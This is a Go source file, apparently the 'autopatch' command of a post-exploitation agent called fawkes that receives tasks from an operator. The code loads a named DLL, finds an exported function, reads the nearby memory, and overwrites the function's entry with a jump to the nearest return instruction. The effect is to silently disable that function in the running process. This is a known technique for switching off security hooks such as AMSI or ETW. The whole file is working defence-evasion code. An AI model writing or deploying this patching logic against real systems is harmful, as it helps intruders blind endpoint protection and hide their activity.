//go:build windows
// +build windows

package commands

import (
	"encoding/json"
	"fmt"
	"strings"
	"syscall"
	"unsafe"

	"fawkes/pkg/structs"
)

// AutoPatchCommand implements the autopatch command
type AutoPatchCommand struct{}

// Name returns the command name
func (c *AutoPatchCommand) Name() string {
	return "autopatch"
}

// Description returns the command description
func (c *AutoPatchCommand) Description() string {
	return "Automatically patch a function by jumping to the nearest return (C3) instruction"
}

// AutoPatchArgs represents the arguments for autopatch command
type AutoPatchArgs struct {
	DllName      string `json:"dll_name"`
	FunctionName string `json:"function_name"`
	NumBytes     int    `json:"num_bytes"`
}

// Execute executes the autopatch command
func (c *AutoPatchCommand) Execute(task structs.Task) structs.CommandResult {
	var args AutoPatchArgs

	// Parse arguments
	if err := json.Unmarshal([]byte(task.Params), &args); err != nil {
		// Try parsing as space-separated string
		parts := strings.Fields(task.Params)
		if len(parts) != 3 {
			return structs.CommandResult{
				Output:    "Error: Invalid arguments. Usage: autopatch <dll_name> <function_name> <num_bytes>",
				Status:    "error",
				Completed: true,
			}
		}
		args.DllName = parts[0]
		args.FunctionName = parts[1]
		fmt.Sscanf(parts[2], "%d", &args.NumBytes)
	}

	// Load DLL
	dll, err := syscall.LoadDLL(args.DllName)
	if err != nil {
		return structs.CommandResult{
			Output:    fmt.Sprintf("Error loading DLL %s: %v", args.DllName, err),
			Status:    "error",
			Completed: true,
		}
	}
	defer dll.Release()

	// Get function address
	proc, err := dll.FindProc(args.FunctionName)
	if err != nil {
		return structs.CommandResult{
			Output:    fmt.Sprintf("Error finding function %s: %v", args.FunctionName, err),
			Status:    "error",
			Completed: true,
		}
	}

	functionAddress := proc.Addr()

	// Calculate buffer size (read backwards and forwards)
	bufferSize := args.NumBytes * 2
	buffer := make([]byte, bufferSize)

	// Read memory around the function address
	kernel32 := syscall.MustLoadDLL("kernel32.dll")
	readProcessMemory := kernel32.MustFindProc("ReadProcessMemory")

	currentProcess, _ := syscall.GetCurrentProcess()
	var bytesRead uintptr

	// Read from (functionAddress - numBytes) forward
	targetAddress := uintptr(functionAddress) - uintptr(args.NumBytes)

	ret, _, err := readProcessMemory.Call(
		uintptr(currentProcess),
		targetAddress,
		uintptr(unsafe.Pointer(&buffer[0])),
		uintptr(bufferSize),
		uintptr(unsafe.Pointer(&bytesRead)),
	)

	if ret == 0 {
		return structs.CommandResult{
			Output:    fmt.Sprintf("Error reading memory: %v", err),
			Status:    "error",
			Completed: true,
		}
	}

	// Find nearest C3 (return) instruction
	c3Index := -1
	for i := bufferSize - 1; i >= 0; i-- {
		if buffer[i] == 0xC3 {
			c3Index = i
			break
		}
	}

	if c3Index == -1 {
		return structs.CommandResult{
			Output:    "Error: No C3 (return) instruction found in search range",
			Status:    "error",
			Completed: true,
		}
	}

	// Calculate offset for JMP instruction relative to function address
	offset := c3Index - args.NumBytes

	// Determine jump instruction (short JMP or near JMP)
	var jumpOp []byte
	var jumpType string

	if offset >= -128 && offset <= 127 {
		// Short JMP (EB XX)
		jumpOp = []byte{0xEB, byte(offset - 2)}
		jumpType = "short"
	} else {
		// Near JMP (E9 XX XX XX XX)
		jumpOffset := int32(offset - 5)
		jumpOp = make([]byte, 5)
		jumpOp[0] = 0xE9
		jumpOp[1] = byte(jumpOffset)
		jumpOp[2] = byte(jumpOffset >> 8)
		jumpOp[3] = byte(jumpOffset >> 16)
		jumpOp[4] = byte(jumpOffset >> 24)
		jumpType = "near"
	}

	// Write jump instruction
	writeProcessMemory := kernel32.MustFindProc("WriteProcessMemory")
	var bytesWritten uintptr

	ret, _, err = writeProcessMemory.Call(
		uintptr(currentProcess),
		uintptr(functionAddress),
		uintptr(unsafe.Pointer(&jumpOp[0])),
		uintptr(len(jumpOp)),
		uintptr(unsafe.Pointer(&bytesWritten)),
	)

	if ret == 0 {
		return structs.CommandResult{
			Output:    fmt.Sprintf("Error writing jump instruction: %v", err),
			Status:    "error",
			Completed: true,
		}
	}

	c3Address := targetAddress + uintptr(c3Index)

	output := fmt.Sprintf("AutoPatch applied successfully!\n")
	output += fmt.Sprintf("Function: %s!%s at 0x%x\n", args.DllName, args.FunctionName, functionAddress)
	output += fmt.Sprintf("Found C3 at offset %d (0x%x)\n", offset, c3Address)
	output += fmt.Sprintf("Applied %s JMP (%d bytes)\n", jumpType, len(jumpOp))
	output += fmt.Sprintf("Jump bytes: %X", jumpOp)

	return structs.CommandResult{
		Output:    output,
		Status:    "success",
		Completed: true,
	}
}
